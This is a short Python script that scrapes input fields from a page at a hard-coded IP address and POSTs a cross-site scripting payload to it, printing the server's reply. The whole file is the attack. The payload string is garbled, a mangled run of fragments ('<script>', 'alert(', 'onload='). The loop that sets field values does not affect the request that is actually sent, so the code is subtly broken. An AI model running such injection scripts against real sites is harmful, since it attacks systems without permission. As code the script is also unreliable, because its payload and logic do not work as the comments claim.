import requests
from bs4 import BeautifulSoup

url = "http://51.15.136.118/test.php/"  # replace with your URL

# Define the payload to be injected
payload = {'user_input': '<script>", "alert(", "onload=', 'submit': 'Submit'}

# Make a GET request to the URL and parse the HTML response using Beautiful Soup
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')

# Find all the input fields on the page
input_fields = soup.find_all('input')

# Loop over each input field and inject the payload in the 'user_input' field
for field in input_fields:
    if field.get('type') == 'text':
        field['value'] = payload['user_input']

# Submit the form by making an HTTP POST request with the modified payload
response = requests.post(url, data=payload)

# Print the response text, which contains the content of the manipulated page
print(response.text)
print(response.content)